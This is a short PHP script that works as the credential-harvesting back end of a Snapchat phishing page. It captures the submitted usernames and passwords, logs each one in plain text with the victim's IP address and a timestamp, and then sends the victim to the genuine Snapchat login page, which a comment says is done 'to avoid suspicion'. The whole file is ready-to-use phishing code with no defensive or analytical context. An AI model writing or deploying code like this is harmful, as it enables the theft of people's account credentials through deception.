<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');

    $log = "Time: $time | IP: $ip | Username: $username | Password: $password\n";

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);

    // Redirect to the real Snapchat login page to avoid suspicion
    header('Location: https://accounts.snapchat.com/accounts/login');
    exit();
}
?>
